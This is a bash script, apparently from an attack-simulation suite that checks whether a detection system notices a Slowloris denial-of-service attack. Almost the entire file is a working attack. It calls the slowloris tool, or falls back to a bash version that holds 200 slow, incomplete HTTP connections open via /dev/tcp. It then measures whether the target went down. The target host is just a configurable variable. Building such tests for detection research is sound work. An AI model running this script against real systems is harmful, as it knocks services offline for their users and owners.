#!/usr/bin/env bash
# =============================================================================
# 06 — DoS: Slowloris (HTTP Slow Attack)
# Tool: slowloris (Python) or manual implementation
# SSS should detect: DoS via slow/incomplete HTTP connections
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "06_dos_slowloris"

VULN_PORT="${VULN_APP_PORT:-8888}"
DURATION=30       # seconds
SOCKETS=200       # concurrent slow connections

echo "[*] Checking target availability before attack..."
pre_check=$(curl -sf -o /dev/null -w "%{http_code}" \
    --max-time 5 "http://${TARGET_IP}:${VULN_PORT}/health" 2>/dev/null) || pre_check="000"
echo "  Pre-attack HTTP status: ${pre_check}"

# ---------------------------------------------------------------------------
# Slowloris implementation (pure bash fallback if pip package unavailable)
# ---------------------------------------------------------------------------
slowloris_bash() {
    local target="$1"
    local port="$2"
    local num_sockets="$3"
    local duration="$4"

    echo "[*] Starting Slowloris (bash) with ${num_sockets} sockets for ${duration}s..."
    local pids=()
    local end_time=$((SECONDS + duration))

    # Open slow connections
    for ((i=0; i<num_sockets; i++)); do
        (
            while [[ $SECONDS -lt $end_time ]]; do
                exec 3<>/dev/tcp/"${target}"/"${port}" 2>/dev/null || break
                echo -e "GET / HTTP/1.1\r\nHost: ${target}\r\n" >&3 2>/dev/null || break
                # Send partial headers slowly
                for ((j=0; j<10; j++)); do
                    echo -e "X-Slow-${j}: keepalive\r\n" >&3 2>/dev/null || break 2
                    sleep 3
                done
                exec 3>&- 2>/dev/null || true
            done
        ) &
        pids+=($!)
    done

    # Wait for duration
    sleep "${duration}"

    # Clean up
    for pid in "${pids[@]}"; do
        kill "${pid}" 2>/dev/null || true
    done
    wait 2>/dev/null || true
}

# Try the Python slowloris package first, fall back to bash
if command -v slowloris &>/dev/null; then
    echo "[*] Using Python slowloris package..."
    timeout "${DURATION}" slowloris "${TARGET_IP}" \
        -p "${VULN_PORT}" \
        -s "${SOCKETS}" \
        >/tmp/slowloris_output.txt 2>&1 || true
    slow_output=$(cat /tmp/slowloris_output.txt 2>/dev/null || echo "")
else
    echo "[*] Python slowloris not found, using bash implementation..."
    slowloris_bash "${TARGET_IP}" "${VULN_PORT}" "${SOCKETS}" "${DURATION}"
    slow_output="Bash slowloris: ${SOCKETS} slow connections for ${DURATION}s"
fi

# Check if target is still responsive
echo "[*] Checking target availability after attack..."
sleep 2
post_check=$(curl -sf -o /dev/null -w "%{http_code}" \
    --max-time 10 "http://${TARGET_IP}:${VULN_PORT}/health" 2>/dev/null) || post_check="000"
echo "  Post-attack HTTP status: ${post_check}"

if [[ "${pre_check}" != "000" && "${post_check}" == "000" ]]; then
    evidence="Slowloris caused service disruption. Pre: HTTP ${pre_check}, Post: unreachable."
    record_result "true" "${evidence}" "${slow_output}"
elif [[ "${pre_check}" == "000" ]]; then
    evidence="Target was already unreachable before attack."
    record_result "false" "${evidence}" "${slow_output}"
else
    response_time=$(curl -sf -o /dev/null -w "%{time_total}" \
        --max-time 10 "http://${TARGET_IP}:${VULN_PORT}/health" 2>/dev/null) || response_time="timeout"
    if [[ "${response_time}" == "timeout" ]]; then
        evidence="Slowloris caused degraded performance (health check timed out)."
        record_result "true" "${evidence}" "${slow_output}"
    else
        evidence="Slowloris ran ${DURATION}s / ${SOCKETS} sockets. Service still responsive (${response_time}s). May have been mitigated."
        record_result "false" "${evidence}" "${slow_output}"
    fi
fi

rm -f /tmp/slowloris_output.txt
